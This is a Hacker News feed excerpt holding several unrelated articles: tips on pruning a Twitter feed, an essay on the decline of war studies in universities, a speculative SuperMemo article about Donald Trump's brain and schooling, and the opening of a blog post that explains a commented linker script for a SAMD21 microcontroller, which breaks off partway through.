<p><strong>Tip #1</strong></p>
<p>Don’t follow brands. Follow people.</p>
<p>I’ll bring the sheep here, again.</p>
<p>When I imagine a brand account, I imagine the shepherd.</p>
<p>And all of the 100-200-500k followers as the sheep.</p>
<p><img src="https://user-images.githubusercontent.com/32199592/104541200-1599cd80-5647-11eb-8d7f-f89ae517eb81.png" alt="shepherd.jpg"></p><p>The only reason brand accounts exist is to convince you - in obvious or non-obvious ways - that you need their product in some way or the other. 99-100% of brand accounts posts are pure marketing. You do not need them.
It’s like bombarding your own feed with their ads - full time - <em>with your full consent</em>. Especially so if you are already consuming a brand’s product. Why?!</p>
<p>Who should you follow then?</p>
<p>Follow people. Now, you might argue that people themselves can be brands and you are absolutely right - avoid them too. This goes for popular celebrities, sportspeople, singers etc.
Around half the time, you are probably going to see marketing stuff from them as well. Not all are like that of course, apply your judgement. I respect a lot of celebrities but I don’t follow them because I simply don’t need their opinion in my feed - I couldn’t care any less - they are artists, I liked their art, I liked how they performed but that doesn’t mean I like their opinion nor do I need to listen to them on every single issue there is. At the end of the day, including every celebrity or band or anything in your feed just increases the “distraction” score in your feed.</p>
<p>Okay. Brands are out. Brand people are out. What next?</p>
<p>Follow thinkers. Follow do-ers. Follow people who are creating something.</p>
<p>Some follows I would recommend in no particular order:
<a href="https://twitter.com/naval/" target="_blank" rel="noopener noreferrer"> @naval </a>,
<a href="https://twitter.com/nntaleb/" target="_blank" rel="noopener noreferrer"> @nntaleb </a>,
<a href="https://twitter.com/JamesClear/" target="_blank" rel="noopener noreferrer"> @JamesClear </a>,
<a href="https://twitter.com/Kpaxs/" target="_blank" rel="noopener noreferrer">
@Kpaxs </a>,
<a href="https://twitter.com/ArmaniTalks" target="_blank" rel="noopener noreferrer"> @ArmaniTalks </a> ,
<a href="https://twitter.com/EdLatimore" target="_blank" rel="noopener noreferrer"> @EdLatimore </a>,
<a href="https://twitter.com/galjudo" target="_blank" rel="noopener noreferrer"> @galjudo </a>,
<a href="https://twitter.com/david_perell/" target="_blank" rel="noopener noreferrer"> @David_Perell </a>,</p>
<p>This is a subjective list, of course, but the idea remains the same: when you scroll - scroll to think, not to react. The posts/tweets in your feed should stop and make you think. If they enable <em>only</em> a reaction like rage or anxiety - remove it.</p>
<blockquote><div lang="en" dir="ltr"><p>A simple heuristic to clean your social media feed:</p><p>Scroll to think, not to react</p><p>Reduce content that enables only a reaction. <br>Increase content that stops and makes you think.</p></div>— Akhil (@akhlkg) <a href="https://twitter.com/akhlkg/status/1346891698861862913?ref_src=twsrc%5Etfw">January 6, 2021</a></blockquote> 

<p><strong>Tip #2</strong></p>
<p>When something is trending and it doesn’t really matter to you much, mute all the words/hashtags/etc related to it. The “Explore” section in Twitter is a black hole of distractions. Twitter will try to shove you up with random stuff all the time in your feed - but mute/block/ignore them all - this takes conscious effort but is well worth it.</p>
<p><img src="https://user-images.githubusercontent.com/32199592/104541285-5691e200-5647-11eb-93d6-ed60a6cfa293.png" alt="twet.jpg"></p><p>If it's a trending event you do genuinely care about and you must “react” to it - here’s my two step strategy:</p>
<ol>
<li>
<p><strong>Ignore ‘the first wave’</strong></p>
<p>The first wave is the most emotional one. The purpose of the first wave, knowingly or unknowingly, is to polarise. There is no place for rationality in the first wave of posts, trends, articles, etc. You are likely going to see the same type/flavour of content - over and over from all sorts of people which essentially just convey the same thing in different shades of rage. There is nothing against the stream, yet. Mute ‘em all.</p>
</li>
<li>
<p><strong>Assess the aftermath</strong></p>
<p>Once the first wave is gone and the hashtags die, start looking around. This can be anywhere from 1 week to several months depending on the issue. You are searching for truth, so don’t look at the news - if you’re reading articles online, don’t just look at one publisher, read on the same article by different publishers. Remember, each publishing house has a “flavour” of twisting things. An easy way to cancel the bias out is to read from many publishers and see what remains common. Now analyse the common facts - those are the fundamental facts that supposedly happened and anything above that, is just an opinion.</p>
<p>You can also look if the “thinkers” are reacting. If so, see what they are saying.
It takes effort to get to the truth and navigate through the noise, so I don’t end up doing this a lot of times because I simply didn't care about the event as much as I thought. And it looks like I end up doing okay.</p>
</li>
</ol>
<hr>

<p>That’s about it. In theory, you can apply these principles to any social media platform. I tested and developed these on Twitter but the fundamental idea remains the same: <strong>scroll to think, not to react.</strong></p>
<p>And this fundamental idea helped me a lot. Twitter taught me a lot of things that form a core part of who I am now - staying healthy, strength training, mental models, entrepreneurship, making money online, writing.</p>
<p>You can use your distractions to literally change your life - and I really hope you do!</p></div></div>]]>
            </description>
            <link>https://www.akhilkg.me/blog/distractions</link>
            <guid isPermaLink="false">hacker-news-small-sites-25772946</guid>
            <pubDate>Thu, 14 Jan 2021 06:39:14 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[If you want peace, study war]]>
            </title>
            <description>
<![CDATA[
Score 205 | Comments 202 (<a href="https://news.ycombinator.com/item?id=25772365">thread link</a>) | @ascertain
<br/>
January 13, 2021 | https://www.persuasion.community/p/if-you-want-peace-study-war-533 | <a href="https://web.archive.org/web/*/https://www.persuasion.community/p/if-you-want-peace-study-war-533">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><figure><a target="_blank" href="https://cdn.substack.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Fee9f8cb1-eee9-4e69-bce8-d7b52537900a_3896x2568.jpeg"><img src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Fee9f8cb1-eee9-4e69-bce8-d7b52537900a_3896x2568.jpeg" data-attrs="{&quot;src&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/ee9f8cb1-eee9-4e69-bce8-d7b52537900a_3896x2568.jpeg&quot;,&quot;height&quot;:960,&quot;width&quot;:1456,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:1194587,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/jpeg&quot;,&quot;href&quot;:null}" alt=""></a></figure></div><p><strong>“War…What is it good for?” </strong>the classic song asks. Many universities agree on the answer: “Absolutely nothing.”</p><p>Although anthropologists and archeologists still wonder why human beings have for so long organized themselves to fight, the study of war in history and political science departments is fading. Senior scholars are retiring and not being replaced, or their posts are allocated to other fields of history. Each year, fewer courses are offered on great conflicts such as the Napoleonic wars, the total wars of the 20th century, and the Cold War. The Second World War, you may hear on campus, “has been done.”</p><p>Yet war remains one of the events—along with revolution, famine, financial collapse and, as we are learning again, pandemics—that change the course of history. In privileged countries, we forget the importance of military conflicts because we have enjoyed the “Long Peace” that followed the Second World War. Other places have not been so fortunate, with wars around the world almost every year since 1945, bringing millions of deaths and creating millions more refugees. Meanwhile, the world’s great powers maintain large military establishments, and still prepare for battle. </p><p>It is as important as ever to understand war—its causes, nature and consequences—and the many ways that conflicts have shaped our societies. The conquering armies that came from the Arabian Peninsula in the 7th century after the Prophet Mohammad’s death created new empires and spread the new religion of Islam across the Middle East, North Africa and the Iberian Peninsula. The Seven Years’ War (1756-1763), a global conflict, laid the foundations for the dominance of the British Empire and the bankruptcy of France, which helped to fuel the French Revolution.&nbsp; </p><p>War can also speed up advances in science and technology that have benefits in peacetime. Think of the development of penicillin, blood transfusions, radar, or the transistor. And war can bring about significant social change, often for the better. The need for mass armies in the 19th and 20th centuries meant that governments had to treat the lower classes better, whether by educating them or by improving public health. In many countries that fought in the two world wars, ruling classes recognized the contributions of women and the working classes, granting them the franchise and introducing social benefits. </p><p>So why do history faculties, which accept the need to study other great forces in history, such as changes in the means of production or systems of belief, shy from war? I suspect that horror at the phenomenon itself has affected universities’ willingness to treat it as a subject for scholarship. Years ago, when I proposed a new course on war and society, an education consultant asked me, “Why don’t you call it peace studies?” </p><p>I have since met with incomprehension, even hostility, when I have pointed out that wars can bring unintended benefits. However much I say that we would not <em>choose</em> to make war in order to improve our societies, I am charged with loving war. Yet nobody would say that the study of imperialism, racism or famine means that we think those are good things.</p><p><strong>The history of war is neglected for other reasons, too. </strong>First, separate histories—of women, emotions, food and the environment, for example—have come along. Quite rightly, room has been made for them in the big and eclectic house that is the study of the past. However, part of the shift away from war studies owes to the quest for “social justice”—intended as a drive for radical change in society at large—that has taken root in many history faculties. </p><p>Here, for example, is how the chair of Historical and Cultural Studies at the Scarborough campus of the University of Toronto, Natalie Rothman, <a href="https://www.utsc.utoronto.ca/hcs/">welcomed students</a> this autumn: “As a department, we have strengthened our resolve to confront racism, colonialism and Islamophobia throughout our curriculum and in our co-curricular initiatives.” The University of Berkeley in California <a href="https://history.berkeley.edu/graduate/prospective-students/admissions">asks prospective graduate students</a> to provide “evidence of how you have come to understand the barriers faced by others, evidence of your academic service to advance equitable access to higher education for women, racial minorities, and individuals from other groups that have been historically underrepresented in higher education, evidence of your research focusing on underserved populations or related issues of inequality, or evidence of your leadership among such groups.” It is hard to quarrel with such goals, but their impact on curriculum has been to <a href="http://www.nytimes.com/2016/08/29/opinion/why-did-we-stop-teaching-political-history.html?smid=em-share">downgrade subjects such as political and military history,</a> which are seen as too focused on elites and complicit with hierarchy and oppression. </p><p>Another factor is that history overall is worryingly in decline as an academic subject. While it remains popular among publishers and readers, enrollments in history majors are significantly down. They have <a href="https://www.historians.org/publications-and-directories/perspectives-on-history/december-2018/the-history-ba-since-the-great-recession-the-2018-aha-majors-report">dropped more than any other major</a> in the humanities—perhaps by as much as <a href="http://www.chronicle.com/article/why-are-students-ditching-the-history-major">one-third</a> in <a href="https://www.insidehighered.com/news/2018/11/27/new-analysis-history-major-data-says-field-new-low-can-it-be-saved">American universities</a> in the past decade. At the University of Toronto, where I am a professor, colleagues fear that history enrollment may be down as much as 50% over the same period. Even in the United Kingdom, where history remains popular among undergraduates, the number of those majoring in history has dropped by about <a href="https://www.economist.com/britain/2019/07/18/the-study-of-history-is-in-decline-in-britain">one-tenth</a> in the past decade. </p><p>Part of the reason is that, given the lingering effects of the 2008 financial crisis and uncertainty over the economy, students and their parents want university courses to lead to jobs. The decline in history students in turn affects university hiring, and the fewer the tenured faculty, the fewer places for the doctoral students who are the future of the profession.&nbsp; </p><p>Faculties and administrators are not necessarily helping matters, reluctant to include popular courses on war in the curriculum, or to support well-established centers for the study of conflict, some of which are being remodeled, such as the Laurier Centre for Military, Strategic and Disarmament Studies, in Waterloo, Ontario, which will focus more on Canadian history; another at the University of Calgary is fading as those who retire are not replaced. This seems to be particularly true of elite universities. War studies remains in better health at military colleges or some second-tier public universities, while schools of public policy are also still teaching military history, strategic studies and diplomatic history. </p><p>But those in other fields stereotype war studies, characterizing it as too narrowly focused on tactics, battles, or “toys for boys,” meaning armaments. If that caricature were ever true, it has not been for decades. The great historian Sir Michael Howard, who pioneered the modern study of war and trained generations of historians, always insisted that what he was doing was to consider wars within their social and political contexts as a part of the great sweep of history, not somehow separate from it. &nbsp;</p><p><strong>My own evidence of the distaste for military and diplomatic history </strong>at North American universities comes from tales exchanged privately among fellow academics. One retired Canadian military historian recounted that his old faculty had asked him how to reverse the collapse in enrollment. He suggested a course in military history, but the response was a flat no. When a university in the Maritime provinces of eastern Canada was offered a fully funded post in naval history a few years ago—a good fit in a port town that had been deeply affected by conflict on the Atlantic—members of the department rejected it. </p><p>Yet, despite the overall downturn in university history programs, we know from course enrollments that students are interested in war, as indeed they are in international relations, when they get the chance to study them: At Yale, Paul Kennedy’s “Military History of the West” attracted large crowds; at Toronto’s Ryerson University, international relations courses are the most popular choices among students.</p><p>I would not suggest that student preference should determine what departments offer. But they should at least be listened to. Much more important is what we, as societies, want our future leaders to know. Political history, diplomatic history and the study of war—they all offer critical warnings and instructive analogies to our times. Social and cultural histories, and history from the bottom up, add to our understanding too. But we need balance, and a sense of how the micro- and macro-histories mesh with each other. </p><p>Do we really want citizens who have so little knowledge of how war helped to shape our values and societies and our world? Do we ever want another president asking, as Donald Trump <a href="https://www.businessinsider.com/trump-pearl-harbor-memorial-tour-john-kelly-stable-genius-2020-1?r=US&amp;IR=T">did</a> during a visit to the Pearl Harbor memorial: “What’s this all about? What’s this a tour of?” </p><p>If we aren’t aware of how wars happen, we may fail to recognize warning signs when the next conflict brews, as it will. </p><p><strong>Margaret MacMillan is a professor of history at the University of Toronto and emeritus professor at the University of Oxford. Her latest book, </strong><em><strong><a href="https://www.penguinrandomhouse.com/books/609692/war-how-conflict-shaped-us-by-margaret-macmillan/">War: How Conflict Shaped Us</a></strong></em><strong>, was among the </strong><em><strong>New York Times</strong></em><strong> 10 Best Books of 2020. </strong></p></div></div>]]>
            </description>
            <link>https://www.persuasion.community/p/if-you-want-peace-study-war-533</link>
            <guid isPermaLink="false">hacker-news-small-sites-25772365</guid>
            <pubDate>Thu, 14 Jan 2021 05:10:46 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Mystery of Donald Trump's Brain]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25772198">thread link</a>) | @rajlego
<br/>
January 13, 2021 | https://supermemo.guru/wiki/Mystery_of_Donald_Trump%27s_brain | <a href="https://web.archive.org/web/*/https://supermemo.guru/wiki/Mystery_of_Donald_Trump%27s_brain">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="mw-content-text" lang="en" dir="ltr"><p><small>This article by Dr <a href="https://supermemo.guru/wiki/Piotr_Wozniak" title="Piotr Wozniak">Piotr Wozniak</a> is part of <a href="https://supermemo.guru/wiki/SuperMemo_Guru" title="SuperMemo Guru">SuperMemo Guru</a> series on memory, learning, creativity, and problem solving.</small>
</p><p><small><b>Date: August 2018</b></small>
</p><p><a href="https://supermemo.guru/wiki/Comments" title="Comments">Comments</a>
</p>



<h2><span id="Introduction">Introduction</span></h2>
<h3><span id="Trump_is_a_product_of_bad_schooling">Trump is a product of bad schooling</span></h3>
<p>Donald Trump is the most erratic president in the US history.
</p><p>If I told you I blame the education system for the emergence of Trump, you would probably first think about the president's own spotty world knowledge. His presidential credentials are not too strong in that department. However, his education is still well above the average. If I added that my claim is not about Trump but about society, your second bet might be placed on the dismal level of education provided by American schools. I would reply that it does not take a genius to differentiate between qualities of Trump, Hillary, Bush or Obama.
</p><p>Education systems around the world are under the assault of critics of all sorts. We keep complaining and the <a href="https://supermemo.guru/wiki/Reform" title="Reform">change is coming</a>. However, there is still a last bastion of schooling that seems pretty resistant: <a href="https://supermemo.guru/wiki/Socialization" title="Socialization">socialization</a>. There is an overwhelming belief that kids get their socialization at school. Even the best homeschoolers or unschoolers have to repeatedly answer the question: "<i>What about socialization?</i>". In this text, I show that <a href="https://supermemo.guru/wiki/Social_groups_in_socialization#Socialization:_Open_and_closed_systems" title="Social groups in socialization">open system socialization</a> would never let Trump emerge as the leader of the world. A tempered version of Trump might still be successful in real estate. He would be more ethical, less bombastic, more knowledgeable, less angry, more tame, etc. In open socialization, Trump would be better, Trump would be less prominent, and Trump would not care about his prominence.
</p><p>We socialize children for readiness in the idealized society. As a result, they are not ready to face dangers of reality. If Donald Trump sparked a nuclear war, I would blame the polished socialization based on polished rules in closed systems such as schools or daycare centers. 
</p>
<p>Instead of preparing children for an idealized society, we should let them adopt freely to real social environments</p>
<h3><span id="Why_should_I_speak_about_Trump.3F">Why should I speak about Trump?</span></h3>
<p>Using Trump's rich twitter feed, many a psychiatrist cannot patiently watch the show without a burning itch to violate the <a href="https://en.wikipedia.org/wiki/Goldwater_rule">Goldwater rule</a>. It is tempting to produce a distance diagnosis from the comfort of one's own keyboard.
</p><p>I am also mystified by Trump's brain and behavior. However, my diagnosis is pretty different from the consensus that seems to emerge in the media. My viewpoint is unique for two reasons. On one hand, my work on memory, learning, creativity, and intelligence provide a unique interpretation for Trump's thinking and his behavior. My knowledge exculpates the president on many counts. On the other hand, my own behavior and personality show some parallels that help me empathetically get into Trump's head. I need to hurry to add that I respect women, honor the truth, value the rich constellation of cultures, and worship science. However, my similarities with Trump go deep into how my brain works, and why it sets us both well apart from the social norm.
</p><p>In the end, I believe my conclusions are pretty important. If I am right, we will know how to handle Trump, and how to prevent future Trumps from becoming troublemakers.
</p>
<h3><span id="Diagnosis_by_media">Diagnosis by media</span></h3>
<p>Hundreds of armchair critics, haters, and homegrown scientists have hypothesized on the reasons for Donald Trump's weirdness. Serious scientists also took on the job of "remote diagnosis" with most of the conclusions drawn from news reports on Trump's behavior and decisions. I respect the Goldwater rule when it comes to serious diagnosis. Barry Goldwater was also "remotely" diagnosed as "unfit to be president". Psychiatrists tried to avoid making wild generalizations ever since. However, there should be no gag order on a free discussion. This is why I do not mind "virtual science at a distance". I like hypotheses and models, even if <a href="https://supermemo.guru/wiki/What%27s_the_value_of_wrong_models%3F" title="What's the value of wrong models?">they are wrong</a>. Luckily, I am no psychiatrist, and I need not worry about my license and reputation.
</p><p>In wild hypothesizing, Trump is a particularly interesting case because he makes news daily, and so do critics who bring forward a whole array of mental diseases and cognitive impairments. My interest in Trump's brain comes from the fact that my job provides an entirely different perspective, and to the chagrin of all antagonists, I must say that I see no signs of serious pathology. Just the opposite, Trump's brain is pretty good a specimen that many should envy. A good brain does not prevent committing abhorrent acts such as "<a href="https://www.bbc.com/news/world-us-canada-44518942">putting kids in cages</a>" (compare: <a href="https://supermemo.guru/wiki/Would_you_have_a_heart_to_cage_a_puppy%3F" title="Would you have a heart to cage a puppy?">Putting puppies in cages</a>). The trick to a well-organized society is to find ways to employ good brains for a good cause. I see a couple of reasons why this is not the case for Trump.
</p>
<h3><span id="When_Goldwater_rule_does_not_apply">When Goldwater rule does not apply</span></h3>
<p>Sharon Begley argues the pros and cons of the Goldwater rule in her article "<a href="http://www.statnews.com/2017/12/06/goldwater-rule-psychiatry/">Experts challenge the science behind ban on psychiatrists discussing politicians’ mental health</a>".
</p><p>If psychiatry is an art, we can often arrive at major differences of opinion. Apparently, personality disorders are particularly affected. Most of all, if Trump's prime diagnosis is <a href="https://en.wikipedia.org/wiki/Narcissistic_personality_disorder">narcisissm</a>, he is a particularly grateful subject for analysis. Here is an excerpt from Begley's argument (shortened):
</p>
<blockquote><div><p>The flaws of psychiatric exams and the usefulness of other data make the Goldwater rule "scientifically indefensible," said Dr. Leonard Glass, a psychiatrist at McLean Hospital and Harvard Medical School. "I sort of believed" that interviews offer the clearest window into someone’s mind, he said.</p><p>"Psychiatrists are taught that if a patient says he has three drinks a day, double that," said Dr Glass. "The psychiatric interview is flawed." His and other psychiatrists’ clinical experience is backed up by studies going back to the <a href="http://www.wpic.pitt.edu/research/biometrics/Publications/Biometrics%20Archives%20PDF/614Spitzer&amp;Fleiss1974.pdf">1970s</a> in which patients were examined by two psychiatrists <a href="https://www.ncbi.nlm.nih.gov/pmc/articles/PMC2990547/">back-to-back</a>. The rate of agreement was so low that "the unreliability of psychiatric diagnosis has been and still is a major problem in psychiatry," researchers concluded. Later studies reported similar discrepancies, especially for <a href="http://onlinelibrary.wiley.com/doi/10.1111/cpsp.12088/abstract">personality disorders</a>, finding that examination-based conclusions by a psychiatrist often <a href="http://psycnet.apa.org/record/2016-39264-001">disagree with</a> assessments in a structured research setting.</p><p>Markers of pathological narcissism — grandiose self-importance, entitlement, exploitativeness, and lack of empathy — can be seen in someone’s public behavior, especially in the case of a public figure whose behavior and speech has been documented in hundreds of hours of TV interviews, speeches, offhand remarks, and tweets, plus the accounts of people who have lived or worked closely with him. This evidence can also be <a href="https://www.ncbi.nlm.nih.gov/pubmed/17629778">more accurate</a> than information from formal examinations.</p></div></blockquote>
<h3><span id="Is_virtual_psychiatric_diagnosis_valid.3F">Is virtual psychiatric diagnosis valid?</span></h3>
<p>I refuse to give up modelling, or speaking about brains, esp. in a situation where important conclusions can be drawn and inspire others. This is also my chance to transmit an important message about the school system. I claim that Trump is a child of modern schooling. In part, schooling might have damaged Trump. But more importantly, schooling damaged the electorate that Trump can now easily play with his social tricks.
</p><p>Secondly, we can't escape semi-professional psychiatric diagnosis and/or hypothesizing. Hillary 2016 was also a subject of wild hypotheses. At some point a strong meme started circulating the net: she suffered a serious brain trauma in a fall. Allegedly, she was no longer fit to be president.
</p><p>I was a subject of a pop diagnosis too. My own odd behavior was at times explained by my colleagues as a result of growing up without a father. I disagree: I had a dad and two moms (with my older siblings playing the roles). I was also a subject of a wild hypothesis that my <a href="https://supermemo.guru/wiki/Can_incremental_reading_cause_brain_damage%3F" title="Can incremental reading cause brain damage?">brain may have been injured</a> by decades of <a href="https://supermemo.guru/wiki/Incremental_reading" title="Incremental reading">incremental reading</a>. That diagnosis makes me grin and giggle. The childish side of my personality makes me enjoy that kind of anxious theory. Most importantly, such a misdiagnosis is a fantastic ground for inspiration and further analysis.
</p><p>I see nothing wrong with hypothesizing, esp. when it is done in a casual blog with all caveats listed. I stand for <a href="https://supermemo.guru/wiki/On_freedom_of_education_and_freedom_of_information" title="On freedom of education and freedom of information">free speech</a>, and I love inspiration.
</p><p>Some of my words in this text might be a bit offensive to president Trump, and I hate to offend. However, so many bad things have been said about the president, that my text may actually be taken as preponderantly complimentary.
</p>
<h3><span id="Trump.27s_brain_is_good">Trump's brain is good</span></h3>
<p>Opponents may hate to admit it, but Trump's brain is strong and his success is attributable to his brain properties.
</p><p>Most of the criticism of Trump's brain comes from the fact that we have set up a set of standards that we believe world leaders should live up to. They range from moral standards to <a href="https://www.theringer.com/tech/2017/8/30/16224184/president-trump-twitter-spelling">spelling</a>. In psychiatry, we should always divide abnormal behavior into two categories: (1) <b>deviant</b> and (2) <b>maladaptive</b>. In addition, we need to separate (1) cognitive <b>tradeoff</b> from (2) cognitive <b>pathology</b>.
</p><p>Trump meets all the criteria of the <a href="https://en.wikipedia.org/wiki/Narcissistic_personality_disorder">narcissistic personality disorder</a> except for one key factor: his narcissism does not lead to a significant impairment in functioning (in the light of his own goals). Just the opposite. Trump can use his bombast to his advantage. It might be a classic compensation via training. All healthy brains are capable of an excellent adaptation to the environment. Trump's brain has adapted to compensate for a great deal of bullets taken straight from <a href="https://en.wikipedia.org/wiki/DSM-5">DSM-5</a>.
</p><p>Trump is highly deviant, but his adaptation is excellent. He won the presidency. If an individual with a set of maladaptive traits could achieve that, we should fear for the future of democracy. Trump is also high on cognitive tradeoffs: he is strong at spotting patterns, and this characteristic always comes with a high disregard for detail. This is a typical cognitive tradeoff.
</p><p>In summary, Trump's brain is strong. A strong brain does not prevent one from being a freak.
</p>
<h3><span id="Mental_health_evaluation_requirement">Mental health evaluation requirement</span></h3>
<p>47% of Americans believe Trump is unbalanced (source: Public Policy Polling, 865 registered …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://supermemo.guru/wiki/Mystery_of_Donald_Trump%27s_brain">https://supermemo.guru/wiki/Mystery_of_Donald_Trump%27s_brain</a></em></p>]]>
            </description>
            <link>https://supermemo.guru/wiki/Mystery_of_Donald_Trump%27s_brain</link>
            <guid isPermaLink="false">hacker-news-small-sites-25772198</guid>
            <pubDate>Thu, 14 Jan 2021 04:52:09 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The most thoroughly commented linker script (probably)]]>
            </title>
            <description>
<![CDATA[
Score 7 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25771834">thread link</a>) | @todsacerdoti
<br/>
January 13, 2021 | https://blog.thea.codes/the-most-thoroughly-commented-linker-script/ | <a href="https://web.archive.org/web/*/https://blog.thea.codes/the-most-thoroughly-commented-linker-script/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <p>While developing the firmware for Winterbloom's <a href="https://github.com/theacodes/Winterbloom_Castor_and_Pollux">Castor &amp; Pollux</a>, I got very curious as to just what the Microchip/Atmel-provided linker script was doing.</p>
<p>If you've never heard of or seen a linker script before you're not alone. Most of us never even have to think about them, however, on memory constained embedded devices it's not uncommon to need to modify the default linker script.</p>
<p>The linker script controls how <code>ld</code> combines all of your <code>.o</code> files into a single <code>.elf</code> and how that resulting <code>.elf</code> file gets loaded by the target processor.</p>
<p>So I was staring at this script that made absolutely no sense to me. It's filled with incantations and mysterious symbols and there's no indication of what they're for or where they come from.</p>
<p>So I did a <strong>lot</strong> of research and now I can present to you <strong>the most thoroughly commented linker script</strong><sup id="fnref:probably"><a href="#fn:probably">1</a></sup>.</p>
<p>You can see this script in its entirety, comments and all, on <a href="https://github.com/theacodes/Winterbloom_Castor_and_Pollux/blob/master/firmware/scripts/samd21g18a.ld">GitHub</a>. But if you'd like to read it here instead it's transcribed below.</p>
<h2 id="output-format">Output format</h2>
<p>Output format sets the ELF output format to use a specific BFD backend.</p>
<p>The first is the default BFD. The second and third arguments are used
when big (-EB) or little (-EL) endian is requested.</p>
<p>Since the SAM D series are configured with only little endian support,
"elf32-littlearm" is used across the board. This option seems to be
included by Atmel/Microchip out of an abundance of caution, as
arm-none-eabi-ld will do the right thing and use "elf32-littlearm" by
default.</p>
<p>The list of acceptable values can be obtained using <code>objdump -i</code>.</p>
<p>References:</p>
<ul>
<li><a href="https://sourceware.org/binutils/docs/ld/Format-Commands.html#Format-Commands">https://sourceware.org/binutils/docs/ld/Format-Commands.html#Format-Commands</a></li>
<li><a href="https://sourceware.org/binutils/docs/ld/BFD.html">https://sourceware.org/binutils/docs/ld/BFD.html</a></li>
<li><a href="https://ww1.microchip.com/downloads/en/DeviceDoc/SAM_D21_DA1_Family_DataSheet_DS40001882F.pdf">https://ww1.microchip.com/downloads/en/DeviceDoc/SAM_D21_DA1_Family_DataSheet_DS40001882F.pdf</a>
    Section 11.1.11, Cortex M0+ Configuration</li>
</ul>
<pre><span>OUTPUT_FORMAT</span><span>(</span><span>"elf32-littlearm"</span><span>,</span> <span>"elf32-littlearm"</span><span>,</span> <span>"elf32-littlearm"</span><span>)</span>
</pre>
<h2 id="cpu-memory-configuration-variables">CPU memory configuration variables</h2>
<p>These variables are used by the following "MEMORY" command to define
the various memory spaces.</p>
<p>For the SAMD21G18A used by this project, the available Flash is
262kB and the available SRAM is 32kB.</p>
<p>This project also reserves 8kB for the bootloader and 1kB for
"non-volatile memory" (NVM) - which is used by the application
to store calibration and user settings.</p>
<p>References:</p>
<ul>
<li><a href="https://ww1.microchip.com/downloads/en/DeviceDoc/SAM_D21_DA1_Family_DataSheet_DS40001882F.pdf">https://ww1.microchip.com/downloads/en/DeviceDoc/SAM_D21_DA1_Family_DataSheet_DS40001882F.pdf</a>
    Section 10.2, Physical Memory Map</li>
</ul>
<pre><span>FLASH_SIZE</span> <span>=</span> <span>0x40000</span><span>;</span>      <span>/* 256kB */</span>
<span>BOOTLOADER_SIZE</span> <span>=</span> <span>0x2000</span><span>;</span>  <span>/* 8kB */</span>
<span>NVM_SIZE</span> <span>=</span> <span>0x400</span><span>;</span>          <span>/* 1kbB */</span>
<span>SRAM_SIZE</span> <span>=</span> <span>0x8000</span><span>;</span>        <span>/* 32kB */</span>
</pre>
<p>ARM Cortex-M processors use a descending stack and generally
require stack space to be set aside in RAM.</p>
<p>The application's behavior determines just how much stack space
should be reserved. I generally start with 2kB (0x800) of
stack space for Cortex-M0+ projects programmed in C .</p>
<p>You can analyze stack usage in GCC using the <code>-fstack-usage</code>
flag and you can enable compiler warnings for stack usage
with <code>-Wstack-usage=STACK_SIZE</code>.</p>
<p>References:</p>
<ul>
<li><a href="https://embeddedartistry.com/blog/2020/08/17/three-gcc-flags-for-analyzing-memory-usage/">https://embeddedartistry.com/blog/2020/08/17/three-gcc-flags-for-analyzing-memory-usage/</a></li>
<li><a href="https://community.arm.com/developer/ip-products/processors/b/processors-ip-blog/posts/how-much-stack-memory-do-i-need-for-my-arm-cortex--m-applications">https://community.arm.com/developer/ip-products/processors/b/processors-ip-blog/posts/how-much-stack-memory-do-i-need-for-my-arm-cortex--m-applications</a></li>
<li><a href="https://gcc.gnu.org/onlinedocs/gnat_ugn/Static-Stack-Usage-Analysis.html">https://gcc.gnu.org/onlinedocs/gnat_ugn/Static-Stack-Usage-Analysis.html</a></li>
<li><a href="https://gcc.gnu.org/onlinedocs/gcc/Warning-Options.html">https://gcc.gnu.org/onlinedocs/gcc/Warning-Options.html</a></li>
</ul>
<pre><span>STACK_SIZE</span> <span>=</span> <span>DEFINED</span><span>(</span><span>__stack_size__</span><span>)</span> <span>?</span> <span>__stack_size__</span> <span>:</span> <span>0x800</span><span>;</span>
</pre>
<h2 id="memory-space-definition">Memory space definition</h2>
<p>This section declare blocks of memories for specific purposes. Since an
ARM's address space is generally split between Flash, SRAM, peripherals,
and other regions, it's necessary to tell the linker where different
types of data can go in the address space.</p>
<p>These blocks will be used in the <code>SECTIONS</code> command below.</p>
<p>References:</p>
<ul>
<li><a href="https://sourceware.org/binutils/docs/ld/MEMORY.html#MEMORY">https://sourceware.org/binutils/docs/ld/MEMORY.html#MEMORY</a></li>
<li><a href="https://ww1.microchip.com/downloads/en/DeviceDoc/SAM_D21_DA1_Family_DataSheet_DS40001882F.pdf">https://ww1.microchip.com/downloads/en/DeviceDoc/SAM_D21_DA1_Family_DataSheet_DS40001882F.pdf</a>
    Section 10.2, Physical Memory Map</li>
</ul>
<pre><span>MEMORY</span>
<span>{</span>
</pre>
<p>Start with the Flash memory region. On the SAMD21, Flash starts at
the beginning of the address space (<code>0x00000000</code>) and is contiguous
right up to the size of the Flash. Flash is marked a <code>rx</code> so
that the linker knows that this space is read-only (<code>r</code>) and
executable (<code>x</code>).</p>
<p>The "bootloader" section allows this firmware to work with the uf2
bootloader. The bootloader takes the first 0x2000 bytes of flash
memory.</p>
<p>References:</p>
<ul>
<li><a href="https://github.com/adafruit/uf2-samdx1#configuration">https://github.com/adafruit/uf2-samdx1#configuration</a></li>
